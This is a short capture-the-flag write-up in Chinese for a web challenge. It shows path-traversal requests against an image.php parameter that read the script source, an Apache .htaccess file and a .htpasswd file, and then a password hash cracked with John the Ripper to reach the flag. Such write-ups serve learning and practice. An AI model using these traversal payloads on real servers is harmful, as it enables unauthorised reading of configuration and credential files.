Web/Snoopy's flag
=================
> Solved by 連享恩

這題的圖片連結是長這樣：

![](http://54.199.166.146/699e46f901f0533e28b21b4a13e27e2f7b9092a2/image.php?p=flag.png)

image.php參數p後面接檔名

所以我嘗試用`http://54.199.166.146/699e46f901f0533e28b21b4a13e27e2f7b9092a2/image.php?p=../image.php`
就把image.php下載下來了

在註解中提示有admin/這個資料夾，然而需要認證

所以用`http://54.199.166.146/699e46f901f0533e28b21b4a13e27e2f7b9092a2/image.php?p=../admin/.htaccess`拿到了一個檔案

其中一行寫
```
AuthUserFile /var/www/web3/admin/.htpasswd_which_you_should_not_know
```
所以再用`http://54.199.166.146/699e46f901f0533e28b21b4a13e27e2f7b9092a2/image.php?p=../admin/.htpasswd_which_you_should_not_know`拿到
```
secret_admin:K7WeKYm8O5MQI
```
然而K7WeKYm8O5MQI有經過hash

經過John the Ripper password cracker

得到password是`!@#$%^&*`

最後拿到`CTF{apache_config_file_is_sensitive}`